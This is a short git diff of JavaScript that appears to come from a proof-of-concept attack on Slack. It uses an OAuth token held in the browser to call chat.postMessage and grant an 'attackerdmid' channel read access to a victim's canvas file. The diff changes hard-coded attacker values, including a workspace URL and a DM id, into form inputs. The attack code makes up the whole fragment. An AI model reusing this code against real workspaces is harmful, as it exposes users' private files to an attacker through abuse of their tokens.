@@ -29,9 +29,9 @@ var code = document.location.href.split("?")[1].split("&")[0].split('=')[1];
 var data = "code="+code+"&client_id="+id+"&client_secret="+secret;
 
 var sendMessage = () => {
-    var canvasURL = "https://redassassin.slack.com/docs/T010MKRUPJT/F05C1SUPP2T" //document.getElementById("canvasurl").value;
+    var canvasURL = document.getElementById("canvasurl").value;
     var fileid = canvasURL.split("/")[5]
-    var attackerdmid = "D0123FN4FEX" //document.getElementById('attackerdmid').value;
+    var attackerdmid = document.getElementById('attackerdmid').value;
     var token = localStorage.getItem("token");
     fetch("https://slack.com/api/chat.postMessage", {method: "POST", headers:{"Content-Type":"application/x-www-form-urlencoded"}, body: 'channel='+attackerdmid+'&file_permissions='+'[{"grant":"read","file_id":"'+fileid+'"}]'+'&blocks='+'[{"type":"rich_text","elements":[{"type":"rich_text_section","elements":[{"type":"link","url":"'+canvasURL+'"}]}]}]'+'&token='+localStorage.getItem('token')}).then(
         response => response.json()).then((json) => {
